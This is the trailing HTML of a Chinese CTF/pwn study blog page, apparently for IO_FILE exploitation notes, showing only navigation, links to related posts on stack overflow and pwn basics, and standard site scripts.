SiriusHsh&url=https://siriushsh.github.io/posts/IO_FILE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recent Update</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/format-string-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">format string attack学习笔记</a><li><a href="/posts/IO_FILE%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">IO_FILE学习笔记</a><li><a href="/posts/pwn-cheatsheet/">pwn cheatsheet</a><li><a href="/posts/heap%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/">heap利用方式总结</a><li><a href="/posts/HITCON-Training-lab1-lab15/">HITCON-Traning lab1-lab15</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/%E6%B8%B8%E6%88%8F/">游戏</a> <a class="post-tag" href="/tags/%E9%9A%8F%E7%AC%94/">随笔</a> <a class="post-tag" href="/tags/%E4%B9%A6%E7%B1%8D/">书籍</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/pwn-basic/"><div class="card-body"> <em class="timeago small" date="2021-12-25 11:04:00 +0800" >Dec 25, 2021</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>pwn basic</h3><div class="text-muted small"><p> 入门材料现在还蛮多的，看书《从0到1 CTFer成长之路》《CTF特训营》，网站ctfwiki都可以，但是我还是安利一下我觉得很好的入门视频 链接：https://www.youtube.com/watch?v=8zO47WDUdIk 真的从0开始教，适合我这样的小白入门，这里粘一下他slide里的知识点 useful tools Binary Format ...</p></div></div></a></div><div class="card"> <a href="/posts/NTUSTISC-stackoverflow/"><div class="card-body"> <em class="timeago small" date="2021-12-26 14:09:00 +0800" >Dec 26, 2021</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>NTUSTISC - stack overflow</h3><div class="text-muted small"><p> 接着上一篇Pwn基础知识，这篇写一下栈溢出的实验小结，分成两个大部分： NTUSTISC视频中留的练习题 CTF WIKI上的stack overflow部分题目 Lab0 的 pwntools上手题 Return to Text # Lab1 #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;...</p></div></div></a></div><div class="card"> <a href="/posts/ctfwiki-stackoverflow/"><div class="card-body"> <em class="timeago small" date="2022-01-09 14:09:00 +0800" >Jan 9, 2022</em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>ctfwiki - stack overflow</h3><div class="text-muted small"><p> 基本ROP CTF wiki上的题目都是32位的，32位的和64位的区别在于 函数参数 X86 函数的参数放在栈上，在函数返回地址的下方(下方是指：返回地址在低地址，参数在高地址) 就像这样调用gets前，将参数（这里是待赋值的变量的地址）压入栈（放在e...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/format-string-attack%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="btn btn-outline-primary" prompt="Older"><p>format string attack学习笔记</p></a> <a href="/posts/pwn-cheatsheet/" class="btn btn-outline-primary" prompt="Newer"><p>pwn cheatsheet</p></a></div><script src="https://utteranc.es/client.js" repo="SiriusHsh/SiriusHsh.github.io" issue-term="title" crossorigin="anonymous" async> </script> <script type="text/javascript"> $(function() { const origin = "https://utteranc.es"; const iframe = "iframe.utterances-frame"; const lightTheme = "github-light"; const darkTheme = "github-dark"; let initTheme = lightTheme; if ($("html[mode=dark]").length > 0 || ($("html[mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = darkTheme; } addEventListener("message", (event) => { let theme; /* credit to <https://github.com/utterance/utterances/issues/170#issuecomment-594036347> */ if (event.origin === origin) { /* page initial */ theme = initTheme; } else if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* global theme mode changed */ const mode = event.data.message; theme = (mode === ModeToggle.DARK_MODE ? darkTheme : lightTheme); } else { return; } const message = { type: "set-theme", theme: theme }; const utterances = document.querySelector(iframe).contentWindow; utterances.postMessage(message, origin); }); }); </script></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/sirius_hsh">sirius</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/">机器学习</a> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/pwn/">pwn</a> <a class="post-tag" href="/tags/%E6%B8%B8%E6%88%8F/">游戏</a> <a class="post-tag" href="/tags/%E9%9A%8F%E7%AC%94/">随笔</a> <a class="post-tag" href="/tags/%E4%B9%A6%E7%B1%8D/">书籍</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/lozad/dist/lozad.min.js,npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.16.1,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script>
